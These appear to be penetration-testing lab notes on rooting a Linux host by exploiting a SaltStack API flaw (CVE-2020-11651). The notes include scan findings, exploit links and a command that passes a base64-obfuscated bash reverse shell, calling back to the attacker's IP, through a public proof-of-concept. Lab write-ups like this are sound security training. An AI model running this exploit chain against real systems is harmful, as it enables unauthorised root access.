# System Information
OS: Linux

IP: 192.168.156.62

Architecture: x64

# Service Discovery

`scan --autorecon`
## Open Ports & Priority

### 80/tcp HTTP
Server: nginx/1.16.1
Application: Mezzanine (CMS)

Seems like default install, nothing too interesting. 

Look like Mezzanine has had a few XSS CVEs. 
- https://www.exploit-db.com/exploits/52385
- https://www.exploit-db.com/exploits/40799

### 8000/tcp HTTP
Server: nginx/1.16.1
Application: ?

```
curl $IP:8000

{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome
```

*Note, should have inspected response headers more closely. Would have found "X-Upstream: salt-api/3000-1" which would have been helpful*

Feroxbuster finds interesting routes:
- /run
- /login
- /token

Pasting `{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}`...

into Google brings us to https://salt-sproxy.readthedocs.io/en/latest/examples/salt_api.html.

This seems to be the Salt REST API. Found that there's a 9.8 RCE vulnerability for SaltStack through 3002: https://nvd.nist.gov/vuln/detail/cve-2020-16846

Download and try: https://github.com/jasperla/CVE-2020-11651-poc/blob/master/exploit.py

![[Pasted image 20260721212124.png]]

Start shell listener: 

`penelope -p 80 -O`

Execute reverse shell:

`python3 exploit.py -m 192.168.156.62 --exec "printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMSkgJg==|base64 -d|bash"`

Get shell as root:

![[Pasted image 20260721212958.png]]

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260721213046.png]]